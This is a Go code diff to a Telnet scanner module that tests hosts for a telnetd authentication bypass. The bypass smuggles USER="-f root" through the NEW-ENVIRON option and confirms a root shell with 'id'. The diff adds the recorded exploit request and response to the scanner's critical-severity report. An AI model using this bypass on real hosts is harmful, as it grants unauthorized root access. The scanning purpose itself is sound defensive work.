@@ -60,6 +60,7 @@ func TelnetBypassScan(info *structs.HostInfo) (bool, error) {
 	buffer := make([]byte, 4096)
 	// 状态标志
 	exploitSent := false
+	var exploitPayload []byte
 	// newEnvironSupported := false // 暂时保留变量，用于后续可能的调试
 	startTime := time.Now()
 
@@ -159,6 +160,7 @@ func TelnetBypassScan(info *structs.HostInfo) (bool, error) {
 								payload = append(payload, IAC_BYTE, SE_BYTE)
 
 								conn.Write(payload)
+								exploitPayload = append([]byte(nil), payload...)
 								exploitSent = true
 							}
 						} else if opt == OPT_TTYPE_BYTE {
@@ -223,7 +225,11 @@ func TelnetBypassScan(info *structs.HostInfo) (bool, error) {
 	// gologger.Info().Msgf("[Debug] Final Check Response: %s", finalOutput)
 
 	if IsRootShell(cleanResp) {
-		reportVulnerability(info, fmt.Sprintf("ID Command Output: %s", finalOutput))
+		verificationRequest := append(append([]byte(nil), exploitPayload...), []byte("id\n")...)
+		exchanges := []structs.GoPocExchange{
+			binaryGoPocExchange("Telnet environment bypass and root-shell verification", verificationRequest, totalResponse),
+		}
+		reportVulnerability(info, fmt.Sprintf("ID Command Output: %s", finalOutput), exchanges)
 		return true, nil
 	}
 
@@ -290,7 +296,7 @@ func IsRootShell(data []byte) bool {
 		(strings.Contains(s, "#") && !strings.Contains(s, "login") && !strings.Contains(s, "password"))
 }
 
-func reportVulnerability(info *structs.HostInfo, trigger string) {
+func reportVulnerability(info *structs.HostInfo, trigger string, exchanges []structs.GoPocExchange) {
 	showData := fmt.Sprintf("Host: %v:%v\nPayload: USER=\"-f root\"\nTrigger: %s", info.Host, info.Ports, trigger)
 	result := fmt.Sprintf("Telnet://%v:%v CVE-2026-PENDING Auth Bypass", info.Host, info.Ports)
 
@@ -301,6 +307,7 @@ func reportVulnerability(info *structs.HostInfo, trigger string) {
 			Security:    "CRITICAL",
 			Target:      info.Host + ":" + info.Ports,
 			InfoLeft:    showData,
+			Exchanges:   exchanges,
 			Description: "Telnetd Authentication Bypass (CVE-Pending)",
 			ShowMsg:     result},
 	})
@@ -310,6 +317,7 @@ func reportVulnerability(info *structs.HostInfo, trigger string) {
 		Security:    "CRITICAL",
 		Target:      info.Host + ":" + info.Ports,
 		InfoLeft:    showData,
+		Exchanges:   exchanges,
 		Description: "Telnetd Authentication Bypass (CVE-Pending)",
 	})
 }
